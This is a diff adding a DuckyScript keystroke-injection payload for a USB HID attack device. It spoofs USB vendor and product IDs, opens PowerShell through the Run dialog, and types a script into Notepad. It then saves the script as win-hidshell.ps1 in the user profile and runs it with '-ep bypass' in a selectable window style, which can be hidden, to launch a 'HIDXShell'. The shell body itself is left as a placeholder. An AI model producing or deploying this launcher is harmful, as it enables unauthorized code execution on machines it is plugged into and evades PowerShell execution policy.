@@ -1,0 +1,55 @@
+DUCKY_LANG us
+DELAY 2000
+
+REM Name of the saved PowerShell script
+DEFINE #FILENAME win-hidshell.ps1
+REM PowerShell WindowStyle - Normal,Minimized,Maximized or Hidden
+DEFINE #WINDOWSTYLE Normal
+REM USB Identifiers
+DEFINE #Vendor_ID D3C0
+DEFINE #Product_ID D34D
+ 
+REM Delete old PoC file, and start notepad to write the new one
+FUNCTION Clean_Start(#VAR1)
+DELAY 1000
+GUI r
+DELAY 1000
+STRINGLN powershell
+DELAY 1000
+STRINGLN Remove-Item $env:USERPROFILE\#VAR1
+DELAY 250
+STRINGLN notepad.exe;exit
+DELAY 2000
+END_FUNCTION
+
+REM Save PoC on disk in Userprofile folder
+FUNCTION Save_Payload(#VAR4)
+DELAY 2000
+CTRL w
+DELAY 2000
+ENTER
+DELAY 2000
+STRING %USERPROFILE%\#VAR4
+DELAY 2000
+ENTER
+END_FUNCTION
+
+REM Start a PowerShell with given WindowStyle and execute the PoC
+FUNCTION HIDshell_Execution(#VAR5, #VAR6)
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell -WindowStyle #VAR6 -ep bypass 
+DELAY 1000
+STRINGLN Import-Module $env:USERPROFILE\#VAR5;HIDXShell
+END_FUNCTION
+
+Clean_Start(#FILENAME)
+DELAY 1000
+STRINGLN_BLOCK
+<REPLACEME>
+END_STRINGLN
+Save_Payload(#FILENAME)
+HIDshell_Execution(#FILENAME, #WINDOWSTYLE)
+
+
